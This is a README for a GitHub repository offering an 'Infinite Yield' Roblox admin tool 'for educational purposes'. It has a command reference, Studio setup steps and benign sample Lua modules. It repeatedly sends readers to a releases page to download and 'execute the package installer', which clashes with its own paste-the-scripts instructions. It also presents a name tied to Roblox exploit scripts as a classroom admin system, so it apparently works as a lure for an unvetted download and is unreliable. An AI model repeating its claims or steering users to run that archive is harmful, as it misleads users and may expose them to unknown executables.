# Infinite Yield Admin Tool for Roblox — Complete Commands Guide

[![Releases](https://img.shields.io/badge/Downloads-Releases-blue?logo=github)](https://github.com/EL-dev1995/Infinite-Yield-Admin-Tool-for-Roblox-Educational-Purposes/releases)

![Roblox Admin Tool Banner](https://upload.wikimedia.org/wikipedia/commons/7/72/Roblox_Logo_2022.svg)

A learning-focused admin tool set for Roblox. This repository offers a curated build of admin commands and game management utilities. It helps developers, students, and testers explore runtime control, permission flows, and command behavior in a safe study environment.

Table of contents
- About the project 🔍
- Quick demo GIF 🎥
- Key features ✨
- Full command reference 🧭
- Installation — download and execute ⬇️
- Load and run in Roblox Studio 🛠️
- Common workflows and examples 📚
- Configuration and permission model 🔐
- Internals and API reference ⚙️
- Debugging and logs 🐞
- Contributing guide 🤝
- Roadmap 🚧
- Credits and resources 📎
- License 📄

About the project 🔍
This codebase bundles a stable admin command set tailored for study and testing. It exposes common admin actions such as teleport, kick, ban, spawn, model control, and player utilities. Each command has a small handler and clear input pattern. The tool focuses on clarity. It keeps the code modular. You can read, test, and change handlers to learn how admin systems work inside Roblox.

Quick demo GIF 🎥
![Demo GIF](https://cdn.dribbble.com/users/231524/screenshots/2962702/roblox_ui.gif)

Key features ✨
- Command shell. Type commands in chat or a custom GUI.
- Player control. Teleport, bring, kick, ban, heal, respawn.
- Object tools. Spawn models, anchor, unanchor, set collisions.
- Server tools. Rotate map, clear debris, run scripts on server.
- Permission layers. Rank, whitelist, owner-only options.
- Logs. Command log for audit and study.
- Modular design. Each command lives in its module. You can add or remove commands.
- Example configs. Start with safe defaults. Change one file to adjust rights.

Full command reference 🧭
This list covers common commands and how to use them. Use the command name followed by arguments. Replace <player> with a name or partial name. Use quotes for names with spaces.

Basic movement and player control
- fly <player>
  - Enable flight for the player. Use a physics controller. Example: fly Alice
- noclip <player>
  - Remove collisions so the player can pass through geometry. Example: noclip Bob
- walkspeed <player> <value>
  - Set walk speed. Use integers for speed. Example: walkspeed Eve 50
- jumppower <player> <value>
  - Set jump power. Example: jumppower Eve 120
- sit <player>
  - Force the player into sit state.
- heal <player>
  - Restore health to max.
- kill <player>
  - Set health to zero. Use for testing respawn.

Teleport and world control
- bring <player1> <player2>
  - Move player1 to the location of player2. Example: bring Alice Bob
- goto <player> <target>
  - Teleport player to a target. Target can be a spawn, part, or player. Example: goto Alice spawn
- teleport <player1> <player2>
  - Move player1 next to player2.
- teleportall <target>
  - Teleport all players to target.
- setspawn <part>
  - Set a spawn point to a named part.

Player management
- kick <player> [reason]
  - Remove a player from the server. Example: kick John Spamming
- ban <player> [reason]
  - Add player to ban list. Example: ban John Cheating
- unban <player>
  - Remove player from ban list.
- mute <player>
  - Disable chat for the player.
- unmute <player>
  - Re-enable chat.
- warn <player> <message>
  - Send a visible warning to a player.

Group and social tools
- invite <player> <groupId>
  - Invite a player to a group by id.
- promote <player> <rank>
  - Promote a player inside a group. Requires group API and rank id.

Server tools
- shutdown
  - Stop the server. Use only in test environments.
- rejoin <player>
  - Force a player to rejoin. Useful for testing join flow.
- serverhop
  - Move all players to a new server instance. Works only with matchmaking flow.
- clear <type>
  - Clear objects by type. Example: clear terrain

Model and object commands
- spawn <assetId or modelName>
  - Insert an asset into the Workspace. Example: spawn 123456789
- save <modelName>
  - Save a selected model into the tool’s model folder.
- load <modelName>
  - Load a saved model into the Workspace.
- anchor <partName>
  - Anchor a part or model.
- unanchor <partName>
  - Unanchor a part or model.
- weld <partA> <partB>
  - Weld two parts together.
- unattach <object>
  - Remove attachments.

Chat and UI
- chat <player> <message>
  - Make the player say a message. Example: chat Alice Hello world
- gui <player> <on|off>
  - Toggle the admin GUI for a player.

Scripting and runtime
- run <code>
  - Evaluate a short Lua snippet on the server. Use with care.
- exec <scriptName>
  - Execute a named script stored in the tool.
- loopkill <player>
  - Repeatedly kill a player for test loops.

Advanced utility
- freeze <player>
  - Prevent player movement by locking controls.
- spectate <player>
  - Spectate a player’s camera.
- clone <object>
  - Clone an object and parent it to workspace.
- locate <player>
  - Return the coordinates of a player.

Examples
- spawn 123456789
  - Adds an asset to the current map.
- bring "Alice"
  - Moves the player named Alice to your position.
- walkspeed Bob 50
  - Gives Bob a boosted walk pace.
- ban "Bad Player" Cheating
  - Adds a player called Bad Player to the ban list.

Installation — download and execute ⬇️
Download the release package from:
https://github.com/EL-dev1995/Infinite-Yield-Admin-Tool-for-Roblox-Educational-Purposes/releases

The Releases page holds compiled modules and example assets. Download the archive that matches your intent. The package commonly includes:
- admin-module.lua
- commands folder
- example-gui.rbxm
- README and configs

After you download the release file, execute the package installer that matches your workflow:
1. For Studio import:
   - Extract the archive.
   - Open Roblox Studio.
   - Use the Asset Manager or the Import tool.
   - Add example-gui.rbxm to StarterGui.
   - Place admin-module.lua in ServerScriptService.
   - Start the server in Studio and test commands.
2. For manual script install:
   - Open the admin-module.lua file.
   - Paste the module into ServerScriptService as ModuleScript.
   - Create a LocalScript inside StarterPlayerScripts to create a client UI.
   - Wire the RemoteEvent names used by the module.
3. For testing:
   - Run Play Solo in Studio to validate behavior.
   - Execute example admin commands in the chat window.
4. For offline study:
   - Open the command modules in a text editor.
   - Read handlers and change input validation.
   - Re-import after edits.

Load and run in Roblox Studio 🛠️
This section shows a minimal loader pattern. Use it to attach the tool into your test game.

Server setup
1. Create a ModuleScript in ServerScriptService called AdminCore.
2. Paste the contents of admin-module.lua from the release.
3. Ensure RemoteEvents exist:
   - AdminCommandEvent (RemoteEvent) under ReplicatedStorage
   - AdminResponseEvent (RemoteEvent) under ReplicatedStorage
4. Place command modules in ServerScriptService/AdminCommands or pack them inside the core.

Client setup
1. Add a LocalScript to StarterPlayerScripts named AdminClient.
2. Use the following pattern to send commands from the client:
   - AdminClient listens for a keybind to open a small input panel.
   - The input panel sends the full command text to AdminCommandEvent.
3. The server validates the sender by looking up the player’s rank.

Example server validation (concept)
- When AdminCommandEvent fires:
  - Check player.UserId in config.owners or config.whitelist
  - Parse command and args
  - Route to handler module: handlers[cmd]:run(player, args)

Common workflows and examples 📚
Run a permissions test
- Add your test account to config.owners.
- Join Studio test.
- Run a harmless command such as walkspeed <yourname> 30.
- Inspect changes in the Workspace and Player objects.

Create a new command
1. Copy a template module named command_template.lua.
2. Implement fields:
   - name = "example"
   - description = "Short description"
   - args = { "player", "value" }
   - run = function(player, args) ... end
3. Register the module in the main loader:
   - handlers["example"] = require(script.ExampleCommand)

Batch spawn models for a map test
- Use spawn <assetId> multiple times.
- Or prepare a CSV list and call spawn in a loop.

Permission test matrix
- Owner -> full access
- Admin -> most commands except serverwide tools
- Moderator -> limited player controls
- Guest -> no commands

Configuration and permission model 🔐
The tool uses a simple config pattern. Keep the config in a ModuleScript named AdminConfig. The file exposes keys you can change. Example fields:

- owners = { 123456 }         -- user ids with full power
- admins = { 234567, 345678 } -- user ids with elevated rights
- whitelist = { }             -- optional names allowed to use commands
- blockedCommands = { "shutdown", "serverhop" }
- logEnabled = true
- logsFolder = game.ServerStorage:FindFirstChild("AdminLogs")

Permission flow
1. The module receives a command call.
2. It checks the player.UserId against owners and admins.
3. It checks the command against blockedCommands.
4. If all checks pass, it runs the handler.
5. The handler returns a status and message.
6. The module fires AdminResponseEvent back to the caller.

Throttle and rate limits
- Command calls can run at a rate limit.
- The tool uses a per-player cooldown to avoid spam.
- The cooldown can live in the config as cooldownSeconds.

Command registration
- Each command exports a table with run(player, args) function.
- The main loader collects modules from a folder and registers by name.
- Use consistent names and provide aliases in each module.

Internals and API reference ⚙️
Module layout
- AdminCore (ModuleScript)
  - loader
  - handlers map
  - config
  - logging
- Commands (Folder)
  - bring.lua
  - kick.lua
  - ban.lua
  - spawn.lua
  - walkSpeed.lua
- Client
  - Local UI script
  - Input handling
  - Keybinds
- Remote objects
  - ReplicatedStorage.AdminCommandEvent
  - ReplicatedStorage.AdminResponseEvent

Key functions
- AdminCore:register(commandName, module)
  - Adds a command to the handlers map.
- AdminCore:runCommand(player, commandText)
  - Parses text, resolves command, runs handler.
- AdminCore:validatePlayer(player, command)
  - Checks permission rules and returns boolean.
- AdminCore:log(player, commandText, result)
  - Writes an entry to logsFolder.

Command module interface
Each command module should export:
- name (string)
- description (string)
- aliases (table of string)
- args (table)
- run = function(context)
  - context.player
  - context.args
  - context.rawText
  - Return table { success = true, message = "..." }

Data patterns
- Use Player.Character to access body parts.
- Use Humanoid.Died, Humanoid.Health for health logic.
- Use Instance:Clone to replicate models.

Remote event patterns
- Use RemoteEvent:FireServer for client-to-server calls.
- Validate on server. Validate input types and length.
- Return result via RemoteEvent:FireClient.

Debugging and logs 🐞
Logging
- Each command call logs a small JSON-like table.
- Log fields:
  - time
  - userId
  - command
  - args
  - result
- Store logs in ServerStorage.AdminLogs for study.

Runtime debug tips
- Use print statements inside handlers during tests.
- Attach a developer console GUI in Studio to view print output.
- Use warn() when a module fails to load.

Common issues
- Command doesn't run
  - Ensure the user id exists in config.owners or admins.
  - Confirm the command module registers under the correct name.
  - Check AdminCommandEvent exists in ReplicatedStorage.
- Handler errors
  - Open the module and inspect the stack trace in Studio output.
  - Match argument types and counts.
- Asset fails to spawn
  - Confirm the assetId is public or you own the asset.

Contributing guide 🤝
This project welcomes code changes and bug reports focused on learning value. Follow the steps below.

How to contribute
1. Fork the repository.
2. Create a branch: git checkout -b feature/<short-name>
3. Add or change a command module.
4. Update AdminConfig defaults if needed.
5. Run the tool in Studio and test your change.
6. Commit and push.
7. Open a pull request with:
   - What you changed
   - How to test
   - Any caveats

Style and code rules
- Use clear names for modules and functions.
- Keep handlers small and single purpose.
- Use consistent return tables for handlers.
- Add comments for tricky logic.
- Write simple tests for edge cases.

Tests
- Use small test places in Studio to validate commands.
- Create a test folder in Workspace with target parts and players.
- Script automated tests by spawning headless players with command calls.

Labels for PRs
- bugfix
- feature
- docs
- test

Roadmap 🚧
Planned items you can help with:
- Add unit test scaffolding for core loader.
- Add more command examples showing best practices.
- Improve UI to visualize permissions.
- Add support for custom command cooldowns per group.
- Add a compact logger with CSV export.

Credits and resources 📎
- Roblox Developer Hub — API reference and tutorials
- Community assets for example models
- Contributors listed in the Contributors section of the repository

Helpful links
- Releases page and downloads:
  https://github.com/EL-dev1995/Infinite-Yield-Admin-Tool-for-Roblox-Educational-Purposes/releases

- Roblox API reference: https://create.roblox.com/docs/reference/engine
- RemoteEvents guide: https://create.roblox.com/docs/tutorials/remote-events

License 📄
This project uses the MIT license. See the LICENSE file in the repo for full terms.

Appendix — Full sample command module
Use this template to add new commands. Replace name, description, args, and run logic.

```lua
-- ExampleCommand.lua
local command = {}
command.name = "example"
command.description = "A short example command"
command.aliases = { "ex" }
command.args = { "player", "value" }

function command.run(context)
  local player = context.player
  local args = context.args
  if not args[1] then
    return { success = false, message = "Missing target" }
  end
  local targetName = args[1]
  local value = args[2]
  -- Example logic: set a value in leaderstats
  local target = game.Players:FindFirstChild(targetName)
  if not target then
    return { success = false, message = "Target not found" }
  end
  local leader = target:FindFirstChild("leaderstats")
  if leader and leader:FindFirstChild("Score") then
    leader.Score.Value = tonumber(value) or leader.Score.Value
    return { success = true, message = "Score updated" }
  end
  return { success = false, message = "leaderstats missing" }
end

return command
```

Appendix — Example client UI flow
- Press a key to open command input.
- Type a command in the field.
- Press Enter to send it to the server via AdminCommandEvent.
- Receive a response through AdminResponseEvent.
- Show the response in a small toast UI.

Appendix — Example admin config
```lua
-- AdminConfig.lua
return {
  owners = { 12345678 },
  admins = { 23456789 },
  whitelist = {},
  blockedCommands = { "shutdown", "serverhop" },
  cooldownSeconds = 2,
  logEnabled = true,
}
```

Large scale lab setup
- Create a private test place with a map and test avatar models.
- Add automated scenarios that exercise movement, teleport, and spawn.
- Track logs to confirm the sequence of events.

Teaching ideas for class or lab
- Break students into teams. Each team writes one command module.
- Run a demo where teams swap modules and debug each other’s commands.
- Have students implement safe validation for inputs.
- Teach RemoteEvent security by example.

Performance notes
- Avoid heavy work in a command handler. Use tasks or coroutine for long runs.
- For mass spawn, use batching to avoid frame drops.
- Cache frequently used lookups such as player references.

How to extend the logger
- Write a simple exporter that converts logs to CSV.
- Add a web hook that posts logs to a local server for processing.
- Use DataStore for persistent storage if needed in controlled tests.

Where to get the releases and files
https://github.com/EL-dev1995/Infinite-Yield-Admin-Tool-for-Roblox-Educational-Purposes/releases

This link points to the release page. Download the provided release archive. Extract and import the included ModuleScripts and assets into your Studio project to run the tool and explore the commands.